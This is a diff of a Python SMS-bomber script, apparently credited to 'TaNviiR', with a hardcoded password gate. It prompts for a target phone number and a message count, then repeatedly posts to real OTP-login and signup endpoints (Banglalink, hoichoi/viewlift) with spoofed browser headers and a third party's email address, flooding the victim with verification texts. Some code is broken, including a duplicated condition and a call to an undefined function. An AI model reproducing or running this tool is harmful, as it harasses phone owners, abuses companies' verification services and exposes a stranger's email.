@@ -1,4 +1,3 @@
-
 import os
 import requests
 import time
@@ -13,13 +12,10 @@ yellow = '\33[93m'
 green = '\033[1;32m'
 cyan  = "\033[96m"
 end = '\033[0m'
-purple="\033[0;35m"
 os.system('clear')
-line=yellow+"===================="+purple+"===================="+red+"===================="+purple+"===================="+yellow+"===================="+yellow+"===================="+purple+"===================="+red+"===================="+purple+"===================="+yellow+"===================="
+line=yellow+"======================================================================================================================"
 space=" "
-logo=yellow+str("""
-          
-                       
+logo=green+str("""
    ╔═════════════════════════════════╗
    ║ Author.  : TaNviR-AhMeD-RiYaD   ║
    ║ Facebook : MrTaNviiR            ║
@@ -27,20 +23,18 @@ logo=yellow+str("""
    ╚═════════════════════════════════╝
        
  
-  
-  
+                                                  
 """)
 
       
  #HEADER                
-text=lightblue+"\t\tCreated By : "+yellow+"TaNviiR AhMeD"+cyan+"\n\n\t\t★★ "+purple+" CraZy DeveLoper"+cyan+" ★★   \n" 
+text=cyan+"\t\tCreated  By : TaNviiR-RiiYaD"+green+"\n\n\t\t★★ Crazy DeveLoper ★★   \n" 
 notice=""     
 def header():
 	print(logo)
 	print(text)
 	print(line)
 	print(notice)
-
 #SECURITY				
 header()
 print("---------------------------------------")
@@ -50,12 +44,12 @@ n=2
 while n==2:
 		a=str(input(cyan+"\n\n\t\t[>] Username : "+green))
 		b=str(input(cyan+"\n\n\t\t[>] Password : "+green))
-		if a=="Action" and b=="Team":
-			print(green+"\n\n\t\t[ √ ] Accepted")
+		if a=="inbox" and b=="killer":
+			print(green+"\n\n\t\t[ √ ] Correct")
 			n=3
 		else:
 			
-			print(red+"\n\n\t\t[ × ] Rejected Try Again")
+			print(red+"\n\n\t\t[ × ] Wrong Try Again")
 			n=2
 			
 			os.system('clear')
@@ -69,21 +63,22 @@ header()
 while tt<2:
 		os.system('clear')
 		header()
-		number=str(input(lightblue+"\n\n\t [>] Enter Your Target Number :88"+lightblue))
-		ammount=int(input(lightblue+"\n\t [>] Enter The Ammount : "+lightblue))
+		number=str(input(blue+"\n\n [>] Enter Your Target Number : "+yellow))
+		ammount=int(input(blue+"\n [>] Enter The Ammount : "+yellow))
 		os.system('clear')
-		notice=cyan+"\n\t\t\t   [•] Tools iS running......\n\n"
+		notice=cyan+"\n\t   [•]  Tools is Runing......\n\n"
 		header()
 		ammount2=1
 		totalsent=0
 		totalnotsent=0
 		while ammount2<ammount+1:
 			try:
-				if "yy" in number or "yyy" in number:
+				if "yyy" in number or "yyy" in number:
 					r=requests.post("https://assetliteapi.banglalink.net/api/v1/user/otp-login/request",data={"mobile":number})
 						
-				else:                                        url = "https://prod-api.viewlift.com/identity/signup?site=hoichoitv"
-					headers=CaseInsensitiveDict()
+				else:
+					url = "https://prod-api.viewlift.com/identity/signup?site=hoichoitv"
+					headers = CaseInsensitiveDict()
 					headers["Host"] = "prod-api.viewlift.com"
 					headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0"
 					headers["Accept"] = "application/json, text/plain, */*"
@@ -96,38 +91,40 @@ while tt<2:
 					headers["Referer"] = "https://www.hoichoi.tv/"
 					headers["Connection"] = "keep-alive"
 					data = """{\"requestType\":\"send\",\"phoneNumber\":\"+88"""+number+"""\",\"emailConsent\":true,\"whatsappConsent\":true,\"email\":\"sanaur.asif@gmail.com\"}"""
-		                        r= requests.post(url, headers=headers, data=data)
-
-
-                                if ammount2==1:
-					print(purple+"\n\t\t  ★★TaNviiR★★==>   "+green+"[✓] 1st SMS Sent.")
+					r= requests.post(url, headers=headers, data=data)
+												
+				if ammount2==1:
+					print(cyan+"\n\t  ★★TaNviiR★★==>   "+green+"[✓] 1st SMS Sent.")
 				elif ammount2==2:
-					print(purple+"\n\t\t  ★★TaNviiR★★==>   "+green+"[✓] 2nd SMS Sent.")
+					print(cyan+"\n\t  ★★TaNviiR★★==>   "+green+"[✓] 2nd SMS Sent.")
 				elif ammount2==3:
-					print(purple+"\n\t\t  ★★TaNviiR★★==>   "+green+"[✓] 3rd SMS Sent.")
+					print(cyan+"\n\t  ★★TaNviiR★★==>   "+green+"[✓] 3rd SMS Sent.")
 				else:
-					print(purple+"\n\t\t  ★★TaNviiR★★==>   "+green+"[✓] "+str(ammount2)+"th SMS Sent.")
-				time.sleep(0.00000000000000000000000000001)
+					print(cyan+"\n\t  ★★TaNviiR★★==>   "+green+"[✓] "+str(ammount2)+"th SMS Sent.")
+				time.sleep(0.01)
 				totalsent+=1
 				ammount2+=1
 			except:
 				if ammount2==1:
-					print(cyan+"\n\t\t  ★★TaNviiR★★==>   "+red+"[×] 1st SMS Not Sent.")
+					print(cyan+"\n\t  ★★TaNviiR★★==>   "+red+"[×] 1st SMS Not Sent.")
 				elif ammount2==2:
-					print(cyan+"\n\t\t  ★★TaNviiR★★==>   "+red+"[×] 2nd SMS Not Sent.")
+					print(cyan+"\n\t  ★★TaNviiR★★==>   "+red+"[×] 2nd SMS Not Sent.")
 				elif ammount2==3:
-					print(cyan+"\n\t\t  ★★TaNviiR★★==>   "+red+"[×] 3rd SMS Not Sent.")
+					print(cyan+"\n\t  ★★TaNviiR★★==>   "+red+"[×] 3rd SMS Not Sent.")
 				else:
-					print(cyan+"\n\t\t  ★★TaNviiR★★==>   "+red+"[×] "+str(ammount2)+"th SMS Not Sent.")
-					time.sleep(0.000000001)
+					print(cyan+"\n\t  ★★TaNviiR★★==>   "+red+"[×] "+str(ammount2)+"th SMS Not Sent.")
+					time.sleep(0.01)
 					ammount2+=1
 									
 								
 		totalhit=ammount2-1
 		totalnotsent=totalhit-totalsent
-		print(purple+"\n\n\t\t[•] Total Hits : "+yellow+str(totalhit))
+		print(cyan+"\n\n\t\t[•] Total Hits : "+yellow+str(totalhit))
 		print(green+"\n\t\t[✓] Total Sent : "+yellow+str(totalsent))
 		print(red+"\n\t\t[×] Total Not Sent : "+yellow+str(totalnotsent)+"\n")
-		lastt=str(input(purple+"\n\n\t\t  [✓] All Done!\n\t [•] Now Press Enter Key To Continue:\n"))
-		count=1
-	
+		lastt=str(input(cyan+"\n\n\t\t  [✓] All Done!\n\t [•] Now Press Enter Key To Continue\n"))
+		os.system('clear')
+		notice=""
+		text=green+"\n\n\t\t★★★HoicHoi SMS Tools★★★   \n" 
+		header()
+		opt()
